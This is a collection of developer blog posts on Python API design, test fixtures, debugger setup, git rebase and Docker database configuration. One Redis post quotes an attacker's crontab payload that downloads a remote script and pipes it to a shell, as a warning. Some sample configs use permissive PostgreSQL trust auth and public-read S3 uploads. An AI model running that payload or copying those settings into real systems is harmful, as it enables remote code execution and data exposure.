[{"contents":"summary Always use pydantic module\ncontent API design can be a challenging task, particularly when it comes to deciding on the appropriate output format. One common guide for designing JSON APIs is the simple specification provided by the following resource: https://github.com/omniti-labs/jsend.\nHowever, it can be difficult to ensure that team members consistently adhere to these rules, which can require substantial time investment for reviewing pull requests.\nTo promote uniformity in API formatting, the most effective strategy may be to incorporate the formatting rules directly into your code. In the following example, I will illustrate how this can be accomplished using Python.\nThere\u0026rsquo;s a static type checking module called pydantic which enforces type hints at runtime, and provides user friendly errors when data is invalid.\nBelow are examples of how this can be done using Python in jsend.\nresponse example from enum import Enum from typing import Generic, List, TypeVar from pydantic import BaseModel, Field, validator from pydantic.generics import GenericModel T = TypeVar(\u0026#39;T\u0026#39;) class ResponseStatusEnum(str, Enum): SUCCESS = \u0026#39;success\u0026#39; FAIL = \u0026#39;fail\u0026#39; ERROR = \u0026#39;error\u0026#39; class ResponseBaseModel(GenericModel, Generic[T]): data: T | None = None message: str | None = \u0026#39;\u0026#39; status: str = ResponseStatusEnum.success class Config: use_enum_values = True sometimes you will need to return data with pagination, here\u0026rsquo;s the example\npaginate response example class PageModel(GenericModel, Generic[T]): items: List[T] = [] total: int current_page: int last_page: int | None prev_page: int | None next_page: int | None per_page: int class PaginateResponseBaseModel(GenericModel, Generic[T]): data: PageModel[T] message: str | None = \u0026#39;\u0026#39; status: ResponseStatusEnum = ResponseStatusEnum.SUCCESS class Config: use_enum_values = True to use it(FastAPI) from datetime import datetime class ExampleEntity(BaseModel): id: int name: str age: int nick_name: str | None created_at: datetime | None = None updated_at: datetime | None = None class GetExampleResponse(ResponseBaseModel[ExampleEntity]): data: ExampleEntity class GetPaginateExamplesResponse(PaginateResponseBaseModel[ExampleEntity]): data: PageModel[ExampleEntity] router = APIRouter() # {data: {id, name, age, created_at, updated_at}, message, status} @router.get(\u0026#39;/examples/{id}\u0026#39;) def get_example(id) -\u0026gt; GetExampleResponse: \u0026#34;\u0026#34;\u0026#34; Returns: json: { data: { id, name, age, created_at, updated_at }, message, status } \u0026#34;\u0026#34;\u0026#34; data = repo.get_examples(id) return GetExampleResponse(data=data) @router.get(\u0026#39;/paginate-examples/{id}\u0026#39;) def get_examples(id, page:int = 1, per_page: int = 1) -\u0026gt; GetPaginateExamplesResponse: \u0026#34;\u0026#34;\u0026#34; Returns: json: { data: { items: [{id, name, age, created_at, updated_at}], total, current_page, last_page, prev_page, next_page, per_page, }, message, status } \u0026#34;\u0026#34;\u0026#34; data = repo.get_examples_with_paginate(id, page, per_page) return GetPaginateExamplesResponse(data=data) Then, all response will be restricted to the formats\nreferences pydantic typing ","permalink":"http://shachiku.life/2023/03/how-to-restrict-json-api-format-with-python/","summary":"use pydantic, the world is better","title":"如何限制 python json api 格式"},{"contents":"Source https://www.youtube.com/watch?v=i7twT3x5yv8\nSummary 適用於大概 60 min 的面試\n理解問題（5 min） who is the user? what core feature to build? 釐清 non-functional requirement.(安全性、可用性\u0026hellip;) 進行高度抽象的設計並取得認同（20 min） functional-related RESTful API interfaces，注意 API 的回應資料 系統設計示意圖（user-\u0026gt;service-\u0026gt;database），重點在於畫出來的每個服務都是 e2e 不要太快進入細節（db scaling, concurrency, failure scenarios） data model design: the key part of non-functional requirements data access pattern, R/W ratio what db to choose? how to make indexes? 深入設計細節（25 min） 對 non-functional requirement 更為細節的討論 闡明問題-\u0026gt;提出 2 種解法-\u0026gt;討論解法的 tradeoffs-\u0026gt;選定決定解法 無限 loop wrap up（5 min） ","permalink":"http://shachiku.life/2023/03/framework-of-system-design-interview/","summary":"","title":"[推薦] 系統設計面試時的思考框架"},{"contents":"Source https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/\nSummary 為何大部分的 programer 都喜歡重寫 code? 因為讀 code 遠比寫 code 難。 不要隨意重寫 code，因為你等於是丟掉過去所有人的知識之後再寫自己認為更好的—其實只是重頭踩一遍所有的問題，或是達成一件已經毫無經濟效益的事\n重構不是重寫，是每次的修改都會讓程式更加好懂\n","permalink":"http://shachiku.life/2023/03/things-programer-should-never-do/","summary":"寫程式","title":"[推薦] 程式設計師最不該做的事"},{"contents":"When writing tests, you should follow the unit-of-work principle, which means separating data with each test. In Django, there is a method called refresh_from_db that can achieve this. However, in Flask or FastAPI, you need to implement it yourself. Here\u0026rsquo;s how to do it with SQLModel (a SQLAlchemy wrapper):\nconftest.py from sqlalchemy.orm import sessionmaker from sqlmodel import Session, SQLModel @pytest.fixture(autouse=True) def refresh_database(db: Session): SQLModel.metadata.create_all(engine) yield db.close() SQLModel.metadata.drop_all(engine) If your SQLModel ORM includes foreign keys, creating or dropping all of them will result in a foreign key constraint issue.\nclass Application(SQLModel, table=True): __tablename__ = \u0026#39;applications\u0026#39; vendor_id: int | None = Field(default=None, nullable=True, foreign_key=\u0026#39;vendors.id\u0026#39;) category_id: int | None = Field(default=None, nullable=True, foreign_key=\u0026#39;categories.id\u0026#39; ) category: Optional[\u0026#39;Category\u0026#39;] = Relationship(back_populates=\u0026#39;applications\u0026#39;) vendor: Optional[\u0026#39;Vendor\u0026#39;] = Relationship(back_populates=\u0026#39;applications\u0026#39;) As firstly mentioned, sqlmodel is a wrapper of sqlalchemy. It has parameters to pass sqlalchemy\u0026rsquo;s parameters. SQLAlchemy can avoid this by using the use_alter flag.\nfrom sqlalchemy import Column, ForeignKey class Application(SQLModel, table=True): __tablename__ = \u0026#39;applications\u0026#39; vendor_id: int | None = Field(default=None, nullable=True, sa_column=Column( ForeignKey(\u0026#39;vendors.id\u0026#39;, use_alter=True, name=\u0026#39;applications_vendor_id_fkey\u0026#39;))) category_id: int | None = Field(default=None, nullable=True, sa_column=Column( ForeignKey( \u0026#39;categories.id\u0026#39;, use_alter=True, name=\u0026#39;applications_category_id_fkey\u0026#39;))) category: Optional[\u0026#39;Category\u0026#39;] = Relationship(back_populates=\u0026#39;applications\u0026#39;) vendor: Optional[\u0026#39;Vendor\u0026#39;] = Relationship(back_populates=\u0026#39;applications\u0026#39;) Then every thing works.\n","permalink":"http://shachiku.life/2023/03/disable-sqlmodel-foreign-key-constraint/","summary":"","title":"Disable sqlmodel foreign key constraint"},{"contents":"雖然標題是寫工程師，但裡面的概念任何領域都通用\nSource https://codewithoutrules.com/2017/04/17/learning-without-a-mentor/\nSummary 任何學習都有個共通表徵—非常痛苦，當你做某事時覺得你很笨拙且有點惱羞，代表你正在學習。 最好的學習場所在工作裡，因為你有足夠的時間去實踐學習到真實世界中，如果舊的技術已經很熟了就用新技術，或是轉換職位 把無意識的知識傳遞出去，更能幫助雕塑已經掌握的知識 無意識的無知 有意識的知識 無意識的知識：專家的層級在此，使用費曼學習法完全掌握此知識 週期性地更換工作 跟其他專家學習：學習他們的 skills(做得好的事)，以工程師來說像是 debug 技巧、API 設計、重構等 ","permalink":"http://shachiku.life/2023/03/learning-without-a-mentor/","summary":"學習是永遠是痛苦的","title":"[推薦] 如何在沒有 mentor 的情況下自學成才"},{"contents":"Source https://www.youtube.com/watch?v=qpOcRG3e9Q8 24:22\nSummary pure function 是可預測且容易測試—input 什麼 output 就會是什麼 pure function no side effect–不會改到外部變數（output to screen, exception, db 存取等都算） Immutability 是指對 args 的不可變更性 avoid loops(mutation) 因為 loop 通常是對變數進行修改或 output data declarative 的重點在於讓 function 成為一個 expression，而不是使用內建函數或拆小函數 ","permalink":"http://shachiku.life/2023/03/function-programing-the-basics/","summary":"少見的中文講解 FP 概念","title":"[推薦] Function Programing 的基礎觀念"},{"contents":"Source https://www.youtube.com/watch?v=hxGOiiR9ZKg\nSummary Inheritance\u0026rsquo;s cost is expensive when changing requirement, and will need to write methods which your subclass doesn\u0026rsquo;t needs. Use composition to write more usable code.\nre-use abstraction inheritance extending parent class composition using interface Unlike extending parent class, interfaces defines only the critical part of the contract, it\u0026rsquo;s coupling the codes and is adaptable with new requirements.\n","permalink":"http://shachiku.life/2023/01/prefer-composition-over-inheritance/","summary":"","title":"[推薦]少用繼承，多用 composition"},{"contents":"This is a tutorial of how to make a laravel\u0026rsquo;s filesystem-like feature in python\n1. A interface We can create interface by python\u0026rsquo;s abc module\nimport abc class FileSystemManager(abc.ABC): _instance: Any = None def __new__(cls, *args: Any) -\u0026gt; \u0026#39;FileSystemManager\u0026#39;: # use singleton for saving memory usage if not cls._instance: cls._instance = super(FileSystemManager, cls).__new__(cls) return cls._instance @classmethod @abc.abstractmethod def register(cls) -\u0026gt; \u0026#39;FileSystemManager\u0026#39;: # register new disk provider ... @abc.abstractmethod def write(self, filepath: str) -\u0026gt; None ... # and other file related methods like read,mkdir,rmdir... 2. A caller like laravel\u0026rsquo;s Storage Facade Then we wants to interactive with the contract like laravel\u0026rsquo;s Storage::disk(), so make a Storage class with @classmethod\nclass Storage: # provider map, acts like factory instances = {\u0026#39;local\u0026#39;: LocalProvider, \u0026#39;s3\u0026#39;: S3Provider} @classmethod def disk(cls, driver: str = \u0026#39;file\u0026#39;): return cls.instances[driver].register() 3. Implement providers As you can see at second step, there\u0026rsquo;s two providers to implement\n1. LocalProvider import os from . import FileSystemManager class LocalProvider(FileSystemManager): def __init__(self) -\u0026gt; None: self.root = \u0026#39;/path/to/root/storage\u0026#39; @classmethod def register(cls) -\u0026gt; \u0026#39;LocalProvider\u0026#39;: return cls() def read(self, filepath: str) -\u0026gt; str | None: return FileUtil.read(f\u0026#39;{self.root}{filepath}\u0026#39;) def write(self, filepath: str, content: Any, **kwargs: str | None) -\u0026gt; None: if not isinstance(content, str): raise TypeError(\u0026#39;content MUST be a str\u0026#39;) FileUtil.write(f\u0026#39;{self.root}{filepath}\u0026#39;, content) def exists(self, filepath: str) -\u0026gt; bool: return FileUtil.exists(f\u0026#39;{self.root}{filepath}\u0026#39;) def url(self, filename: str) -\u0026gt; str: return f\u0026#39;https://{your_host}/public/{filename}\u0026#39; def make_dirs(self, filepath: str) -\u0026gt; None: FileUtil.make_dirs(f\u0026#39;{self.root}{filepath}\u0026#39;) def remove_file(self, filepath: str) -\u0026gt; None: FileUtil.remove_file(filepath) def remove_dir(self, dir_path: str) -\u0026gt; None: FileUtil.remove_dir(dir_path) 2. S3Provider import logging from . import FileSystemManager import boto3 from botocore.exceptions import ClientError class S3Provider(FileSystemManager): def __init__(self) -\u0026gt; None: config = { \u0026#39;id\u0026#39;: \u0026#39;AWS_ACCESS_KEY_ID\u0026#39;, \u0026#39;secret\u0026#39;: \u0026#39;AWS_SECRET_ACCESS_KEY\u0026#39;, \u0026#39;region\u0026#39;: \u0026#39;AWS_S3_REGION\u0026#39;, \u0026#39;bucket\u0026#39;: \u0026#39;AWS_S3_BUCKET\u0026#39; } self.config = config self.s3 = boto3.client(\u0026#39;s3\u0026#39;, aws_access_key_id=config[\u0026#39;id\u0026#39;], aws_secret_access_key=config[\u0026#39;secret\u0026#39;], region_name=config[\u0026#39;region\u0026#39;]) @classmethod def register(cls) -\u0026gt; \u0026#39;S3Provider\u0026#39;: return cls() def read(self, filepath: str) -\u0026gt; str | None: s3_obj = self.s3.get_object(Bucket=self.config[\u0026#39;bucket\u0026#39;], Key=filepath) response = s3_obj[\u0026#39;Body\u0026#39;].read() return response.decode(\u0026#39;utf-8\u0026#39;) def write(self, filepath: str, content: Any, **kwargs: str | None) -\u0026gt; None: if isinstance(content, str): raise TypeError(\u0026#39;content MUST be types in BytesIO|StringIO\u0026#39;) self.s3.upload_fileobj( content, self.config[\u0026#39;bucket\u0026#39;], filepath, ExtraArgs={ \u0026#39;ACL\u0026#39;: \u0026#39;public-read\u0026#39;, \u0026#39;ContentType\u0026#39;: kwargs.get(\u0026#39;content_type\u0026#39;, \u0026#39;application/octet-stream\u0026#39;) }) def exists(self, filepath: str) -\u0026gt; bool: try: response = self.s3.head_object(Bucket=self.config[\u0026#39;bucket\u0026#39;], Key=filepath) return response[\u0026#39;ResponseMetadata\u0026#39;][\u0026#39;HTTPStatusCode\u0026#39;] == 200 except ClientError as e: logging.info(e) return False def url(self, filename: str) -\u0026gt; str: return f\u0026#39;https://{self.config[\u0026#34;bucket\u0026#34;]}.s3.{self.config[\u0026#34;region\u0026#34;]}.amazonaws.com/{filename}\u0026#39; def make_dirs(self, filepath: str) -\u0026gt; None: raise NotImplementedError( f\u0026#39;method make_dirs not implemented in {self.__class__}\u0026#39;) def remove_file(self, filepath: str) -\u0026gt; None: self.s3.delete_object(Bucket=self.config[\u0026#39;bucket\u0026#39;], Key=filepath) def remove_dir(self, dir_path: str) -\u0026gt; None: if dir_path[-1] != \u0026#39;/\u0026#39;: raise ValueError(\u0026#39;dir_path MUST endswith \u0026#34;/\u0026#34;\u0026#39;) response = self.s3.list_objects(Bucket=self.config[\u0026#39;bucket\u0026#39;], Prefix=dir_path) if \u0026#39;Contents\u0026#39; in response: for obj in response[\u0026#39;Contents\u0026#39;]: self.remove_file(obj[\u0026#39;Key\u0026#39;]) 4. start use After implemented all of them, we can call it like laravel filesystem\nStorage.disk(\u0026#39;s3\u0026#39;).read(...) Storage.disk(\u0026#39;local\u0026#39;).write(..., ...) ","permalink":"http://shachiku.life/2023/01/laravel-like-filesystem-using-python/","summary":"good artists copy","title":"使用 python 模擬 laravel filesystem"},{"contents":"Source https://www.youtube.com/watch?v=h6wBYWWdyYQ\nSummary auth 的本質，很適合上補習班出來的人看\nAuthentication(AuthN): 身份認證（你是誰） Authorization(AuthZ): 可以使用哪些權限 AuthN flow user sign-in client(browser) stores cookie(session) rest of client\u0026rsquo;s request will bring session AuthZ flow login user requests data server parse and check user from cookie server checks if the request action is authorized response ","permalink":"http://shachiku.life/2022/12/what-is-auth/","summary":"當我們說到 auth 時，我們究竟在說什麼","title":"[推薦] auth 沒你想像的複雜"},{"contents":"Source https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/\nSummary 取得正確值的過程都會做驗證，parser 是解析成指定類型的過程報錯（做一次），validation 是檢查是否符合特定類型報錯（做 n 次），so parse, don\u0026rsquo;t validate\n文內重點 the difference between validation and parsing lies almost entirely in how information is preserved a parser is just a function that consumes less-structured input and produces more-structured output. By its very nature, a parser is a partial function—some values in the domain do not correspond to any value in the range—so all parsers must have some notion of failure. type-hinting is the key 實作重點 Let your datatypes inform your code, don’t let your code control your datatypes 使用 type-hinting as much as you can\nTreat functions that return m() with deep suspicion 任何回傳 function 的 function 都要特別謹慎看待，有可能m() 的主要目的是 raise exception\nDon’t be afraid to parse data in multiple passes input 的解析可以依賴於其他 input 的值\nAvoid denormalized representations of data, especially if it’s mutable 不要亂修改 input 的值，keep single source of truth\nKeep denormalized representations of data behind abstraction boundaries 如果必須要修改 input，就封裝一層 DTO 去負責處理\nUse abstract datatypes to make validators “look like” parsers 如果原生的 type 無法有效驗證非法狀態時，另外定義一個 type 處理，不要硬用\n","permalink":"http://shachiku.life/2022/12/parse-dont-validate/","summary":"輸入的階段就直接解析成正確的型態","title":"[推薦] Parse Don't Validate"},{"contents":"The key is launch.json and tasks.json and uvicorn --workers=1\nContext Local for python app, docker container for non-application services like database/redis\u0026hellip;etc\nIf all of your services are run in container you SHOULD use remote debug\n0. Dockerfile Here I use docker-compose as example\ndocker-compose.debug.yml version: \u0026#34;3.8\u0026#34; services: pgsql: image: postgres:13 restart: unless-stopped environment: - POSTGRES_HOST_AUTH_METHOD=trust - POSTGRES_USER=root - POSTGRES_PASSWORD= - POSTGRES_DB=postgres volumes: - postgres:/var/lib/postgresql/data ports: - \u0026#39;5432:5432\u0026#39; privileged: true volumes: postgres: 1. setup python interpreter cmd+shift+p \u0026gt; python: select interpreter \u0026gt; /path/to/your/virtualenv/bin/python\n2. setup launch.json click \u0026ldquo;Run and Debug\u0026rdquo; at VSCode\u0026rsquo;s left menu，\u0026ldquo;create a launch.json\u0026rdquo;\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Python: FastAPI\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;python\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;module\u0026#34;: \u0026#34;uvicorn\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;your.entrypoint\u0026#34;, \u0026#34;--workers=1\u0026#34; ], \u0026#34;envFile\u0026#34;: \u0026#34;${workspaceFolder}/.env\u0026#34;, \u0026#34;env\u0026#34;: { \u0026#34;YOUR_LOCAL_ENV\u0026#34;: \u0026#34;xxxxx\u0026#34; }, \u0026#34;jinja\u0026#34;: true, \u0026#34;justMyCode\u0026#34;: true, \u0026#34;preLaunchTask\u0026#34;: \u0026#34;start debug server\u0026#34;, \u0026#34;postDebugTask\u0026#34;: \u0026#34;stop debug server\u0026#34; } ] } 3. setup tasks.json { \u0026#34;version\u0026#34;: \u0026#34;2.0.0\u0026#34;, \u0026#34;tasks\u0026#34;: [ { \u0026#34;label\u0026#34;: \u0026#34;start debug server\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;docker-compose -f docker-compose.debug.yml up -d\u0026#34; }, { \u0026#34;label\u0026#34;: \u0026#34;stop debug server\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;docker stop xxxxxxx-pgsql-1\u0026#34; } ] } 4. Be a happy debugguy ","permalink":"http://shachiku.life/2022/12/setup-fastapi-debugger-in-vscode-with-docker/","summary":"","title":"Setup FastAPI Debugger in VSCode With Docker"},{"contents":"The key is running only one worker when start uvicorn\nContext Local for python app, docker container for non-application services like database/redis\u0026hellip;etc\nIf all of your services are run in container you SHOULD use remote debug\n0. Dockerfile Here I use docker-compose as example\ndocker-compose.debug.yml version: \u0026#34;3.8\u0026#34; services: pgsql: image: postgres:13 restart: unless-stopped environment: - POSTGRES_HOST_AUTH_METHOD=trust - POSTGRES_USER=root - POSTGRES_PASSWORD= - POSTGRES_DB=postgres volumes: - postgres:/var/lib/postgresql/data ports: - \u0026#39;5432:5432\u0026#39; privileged: true volumes: postgres: 1. setup Run/Debug configurations It\u0026rsquo;s on the top-right corner 2. setup local running configuration choose \u0026ldquo;FastAPI\u0026rdquo; for running configuration\nremember to set --workers=1\n3. setup container running configuration choose docker-compose for your configuration 4. add local configuration At \u0026ldquo;Before launch\u0026rdquo; setting, add your local running configuration complete setup 5. start debugger as a happy debugger ","permalink":"http://shachiku.life/2022/12/setup-fastapi-debugger-in-pycharm-with-docker/","summary":"","title":"Setup FastAPI Debugger in PyCharm With Docker"},{"contents":"最近 open-ai chat 正火，隨便問了幾個問題，發現回答得滿好的，放上來娛樂一下\nQuestion please use the words \u0026#34;php\u0026#34;, \u0026#34;javascript\u0026#34;, \u0026#34;html\u0026#34;, \u0026#34;css\u0026#34; to make a poetry Answer In the world of the web, Where browsers rule supreme, PHP, JavaScript, HTML, and CSS, Come together to create, A world of endless possibilities, Where information flows, And ideas take shape. PHP is the engine, That drives the backend, Processing requests, And generating responses. JavaScript is the spark, That brings the frontend to life, Adding interactivity, And enhancing the user experience. HTML is the structure, That defines the content, Organizing information, Into a coherent whole. CSS is the style, That gives the page its look, Controlling the colors, Fonts, and layouts. Together, these languages, Form the foundation, Of the modern web, Enabling us to create, Innovate, and explore, A world without limits. References open-ai chat ","permalink":"http://shachiku.life/2022/12/if-web-development-is-a-poetry/","summary":"如果開發是首詩","title":"If Web Development Is a Poetry"},{"contents":"路邊撿到的，不是我說的 「其實 mock object 在 testing 時非常有用，你最好也看看我的 Pull Request 去學一下吧」\n「用上 mock object 的 testcase 總比沒用的好，因為 mock object 可以讓你很專心只測試你要測的部份。 排除掉其他你所 depend on 的部份的bug所引起的 testcase fail。」\n「但是 mock object 非常昂貴(指用上的額外的開發時間)所以，我絕對不會建議你任何時候都用上 mock object。」\n『那什麼時候才應該用 mock object 呢？』\n「通常我會用上 mock object 的時機」\n「我寫的東西要 depends on 3rd party 的 resource，像是 aws S3，與其每次 test 都真的跑 aws 去拿 S3 file，我會用上 mock object 去偽裝 aws S3」\n「我要測試的 procedure，有又臭又長的 dependency。而且要 depend on 的 module 不太穏定很多 bug。我會用上 mock object 去迴避」\n「我在寫 core library (像是 caching library )，我要 100% 清楚其怎對 redis/db 操作。這時我會用上 mock object for redis / db。」\n「一般 application logic。我是不會對 db / redis 做 mocking 的。一般而言，這時 mock object 帶來的好處未大得值得其大量所花的時間。」\n","permalink":"http://shachiku.life/2022/11/when-to-use-mock/","summary":"","title":"[寓言故事] When to Use Mock"},{"contents":"Source https://www.youtube.com/watch?v=dGbzlsBuw9M\nSummary 講得十分本質，比起追逐新潮名詞，顧好 SOLID 的根本就可以寫出好程式了\nconway 定律：軟體系統的最佳結構與團隊的組織社會結構互相影響 SRP: 一種分類的方法，一個模組應該只對一種角色負責，只有當角色的需求改變了模組才會改變，為 DDD 的本質 OCP: 利用 SRP 與 DIP 的規範設計出符合此原則的程式而非為了遵循此原則而寫 LSP: 模組只需知道合約的行為，繼承合約的實作不可因互相替換後影響程式 ISP: 模組不應依賴不屬於該模組所需要方法；no god interface/object DIP: 高層次（角色）不該依賴於低層次（IO），比如直接在 controller 裡面叫 orm 就不是好寫法，應該另外拉個 service interface 後去注入他 ","permalink":"http://shachiku.life/2022/11/oop-solid-principle/","summary":"越基礎越抽象","title":"[推薦]物件導向的 SOLID 原則"},{"contents":"Source https://www.youtube.com/watch?v=XhUAIVJ62dQ\nSummary 要預估一件事多久會完成有三個面相：複雜度、時間、錯估的風險，降低風險最有效的方式就是工作拆解，拆得越細風險越低\nMain idea 提出預估事情的元素有\n誰該做 何時要做完 要做多久 誰是低效者 再將 3 獨立出來講解，並提出可能的解法\n","permalink":"http://shachiku.life/2022/11/why-are-estimations-so-hard/","summary":"divide and conquer","title":"[推薦]為何預估這麼困難"},{"contents":"在超多人對同一個 repo 進行開發的情況下很常會有發出去的 PR 過幾週甚至月才被合併的情況發生，會有不少小團隊很少遇到的問題\n與大量他人的 commit 發生衝突 有共用的地方被改掉導致原本的 PR 失敗 沒有衝突但一上去就壞掉，且很難看出原因 reviewer 看 code 效率變低甚至可能無意義 因此在發 PR 時要使用 rebase 功能簡化 commit，讓處理這些問題的阻力降至最低\nrebase rebase 字義上就是重新定義 base branch，詳細功能描述可參考 https://backlog.com/git-tutorial/tw/stepup/stepup2_8.html\n主要目的是讓 branch 變乾淨\n有概念後可以很容易的理解為何用他有辦法解決一開始提到的問題\n如何發 PR 確認 branch 是從 repo 的 main 切出來\n整理開發好的 commit\n# fetch to latest upstream history git fetch origin # 查看所有屬於自己的 commit git log --author=\u0026#34;your-name\u0026#34; # 選擇要 rebase 的 head commit，或是取得你自己建立的 commit 總數後進行 rebase git rebase -i HEAD~n # 如果你忘記你是從哪個 commit 切的可以用 merge-base 找出 git merge-base current_branch main # 66e506853b0366c87f4834bb6b39d341cd094fe9 # then git rebase -i 66e506853b0366c87f4834bb6b39d341cd094fe9 在 interactive 介面可以對 commit 進行 squash 或是 reword\nsquash: 要整併的 commit\nreword: 要修改 commit log 的 commit\n整理完畢後，rebase 到 main branch\ngit rebase origin/main # 可能會有衝突，解完之後繼續進行 rebase git rebase --continue rebase 玩主要 branch 後推上當前 PR\ngit push -f 使用 force push 的原因是因為遠端 branch 的 history 還在發 PR 當下，而本地的 history 已經被 rebase 打亂了，所以不能先 pull 否則會回到原本的 histiry\n成功合併後記得刪除 branch\ngit branch -D \u0026lt;branch_name\u0026gt; git push origin :\u0026lt;branch_name\u0026gt; References https://www.digitalocean.com/community/tutorials/how-to-rebase-and-update-a-pull-request ","permalink":"http://shachiku.life/2022/10/make-pull-request-correctly/","summary":"貢獻開源專案也是如此","title":"發 Pull Request 的正確姿勢"},{"contents":"最近在寫 ruby，因為案子有切版本的需求就用了 rbenv 做不同版本環境切割\n沒想到切一切爛掉所以重罐整個環境，結果就炸了\n每次重灌時都跑出這種錯誤\nlinking shared-library libruby.2.6.dylib Undefined symbols for architecture arm64: \u0026#34;__mh_execute_header\u0026#34;, referenced from: _rb_dump_backtrace_with_lines in addr2line.o ld: symbol(s) not found for architecture arm64 clang: error: linker command failed with exit code 1 (use -v to see invocation) make: *** [libruby.2.6.dylib] Error 1 make: *** Waiting for unfinished jobs.... 參考幾篇文章後發現問題出在 xcode command line tool 14.0 在編譯 ruby 2.6.x 時會有問題\n最後安裝 13.4 就搞定了，解法如下\nsolution 找出 command line tool 安裝路徑 xcode-select -p\nsudo rm -rf /path/to/commandlinetool\ngo to apple developer to download Command Line Tools for Xcode 13.4, link\ninstall\n就搞定拉\nReferences https://github.com/asdf-vm/asdf-ruby/issues/301 https://www.rubyonmac.dev/how-to-install-ruby-on-macos-12-6-apple-silicon ","permalink":"http://shachiku.life/2022/10/macos12.6_install_ruby2.6/","summary":"沒事不要亂升級本地開發環境","title":"在 mac os 12.6 上安裝 ruby 2.6"},{"contents":"使用 alpine 時要特別注意設定檔有沒有被砍掉\n從官方看他的 tag 可以看出有進行移除的行為\n/bin/sh -c set -eux; # ... mkdir -p /usr/src/redis; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1; # ... rm -r /usr/src/redis; # ...end redis.conf dir /data; 預設 /etc 無權限 yaml version: \u0026#39;3\u0026#39; services: redis: image: redis:7.0.4-alpine restart: unless-stopped volumes: - ./redis.conf:/usr/local/etc/redis/redis.conf # 所以要加上 command 指定掛進去的 redis.conf 才會生效 command: redis-server /usr/local/etc/redis/redis.conf # 或是用 cli 的方式處理 #command: \u0026gt; # redis-server --bind 127.0.0.1 # --appendonly no # --save \u0026#34;\u0026#34; # --protected-mode yes ports: - 6379:6379 資安 假如是裝在 vps 上要記得避免 6379 對外出去，因為有人會去攻擊塞入 cache 執行 shell 指令，例如在 log 中看到\nFailed opening the RDB file root (in server root dir /etc/crontabs) for saving: Permission denied 這種 log 時進入 redis-cli 會發現你的 db0 被塞了四個 key: backup4~backup1，內容是類似\n\u0026#34;\\n\\n\\n*/2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh\\n\\n\u0026#34; 這種意圖修改 crontab 去執行 sh 的情況，具體設定如下\nbind 127.0.0.1 protected-mode yes # 確保來源都是 loopback interface ","permalink":"http://shachiku.life/2022/09/docker-custom-alpine-redis-conf/","summary":"這是使用 alpine 版本才有的情況","title":"在 docker 中設定自定義的 redis config"},{"contents":"連到遠端的 database 有幾種方式\nmethod description password 透過 TCP/IP 連入，最基本的方法，缺點是 port 會暴露給外界 ssh 使用 ssh tunnel 的方式連入 proxy 透過 proxy 連入，可在 proxy 管理連線，firewall 也只需認他 ssl 透過 https 連入，與 password 的缺點一樣 在錢不夠的情況下最基本要做的是 ssh 設定，其餘 proxy / ssl 都要花比較多的錢才能做\n這裡介紹如何在機器上設定 ssh 連線\niptables 設定 這裡透過 ufw 進行設定，主要就是增加一條 127.0.0.1:5432 的 rule\n# to any 是為了程式 ufw allow from 127.0.0.1 to any port 5432 docker 設定 docker 會建立獨特的 iptables rules 去達成網路環境隔離的效果，他的優先權比 ufw 高因此需再對 docker 做設定，有幾種方法\nsystemd: 於啟動處增加參數 --iptables=false daemon.json: 於 /etc/docker/daemon.json 寫入 {\u0026quot;iptables\u0026quot;:false} bind ip:port 第三個方法比較適用，這裡列出 docker-compose 的寫法\nservices: db: image: postgres volumes: - ./.docker/postgres/postgres.conf:/var/lib/postgresql/data/postgresql.conf - ./.docker/postgres/pg_hba.conf:/var/lib/postgresql/data/pg_hba.conf ports: - \u0026#39;127.0.0.1:5432:5432\u0026#39; PostgreSQL 設定 於 pg_hba.conf 增加來自 docker 的連線（ssh tunnel）設定以及對所有來源開放（程式）的連線設定\n# TYPE DATABASE USER ADDRESS METHOD host all all host.docker.internal trust host\tall\tall\t0.0.0.0/0\tmd5 上述設定都完成後就可以透過任一個 GUI tool 走 ssh 連線了\nReferences https://www.postgresql.org/docs/current/ssh-tunnels.html https://docs.docker.com/network/iptables/ ","permalink":"http://shachiku.life/2022/09/setup-ssh-connection-on-postgresql-in-docker/","summary":"","title":"使用 ssh 連入 Docker 中的 PostgreSQL"},{"contents":"Source 为什么你有10年经验，但成不了专家？\nSummary 基本上都是老生常談，不過經典的原則本來就是經的起考驗且務實\n避免自動完成：很反直覺，已經習慣的事情要不斷重新檢討精進 離開舒適圈：跨入學習區，做那些超過自己能力一些的事情 犧牲短期利益：進行刻意練級導致短期績效下降，比如用全新的程式語言做一樣的功能 大量重複訓練 持續取得反饋 ","permalink":"http://shachiku.life/2022/07/mindset-of-becoming-an-expert/","summary":"","title":"[推薦] 成為專家的心態"},{"contents":"多貢獻也有機會找到國外工作，讓自己被看見\nSource https://dev.to/isabelcmdcosta/how-to-find-open-source-projects-to-contribute-2o1e\nSummary Aggregators https://up-for-grabs.net/ https://www.codetriage.com/ https://ovio.org/ events GSoC hacktoberfest 24 Pull Requests Outreachy Google Code-in ","permalink":"http://shachiku.life/2022/07/how-to-find-open-source-projects-to-contribute/","summary":"軟體面向全球，不該被拘束在一個地方","title":"[推薦]如何找到開源專案貢獻"},{"contents":"Source 原文\nyoutube 中文解說\nSummary 網路是可靠的：可以設計可重做的機制（狀態池+redo） 延遲為 0：LAN 與 internet 的差異，CDN 解決了延時的問題 頻寬是無限的：internet 服務的頻寬可能是有限的 網路是安全的 網路拓墣是不變的：k8s 大流量會自動擴張、資料/程式搬移或掛掉時有無可能影響其他服務、有無避免單點故障 存在網管：須去理解服務間相互依賴的關係、IaC（基礎建設及代碼）做版控、log 應該要可以監控且有效 傳輸成本為 0：因跨網路，需考慮有效率的傳輸格式（gRPC、MessagePack、json、protobuf\u0026hellip;） 網路是同質的：跨服務的 protocol 可能需要轉換 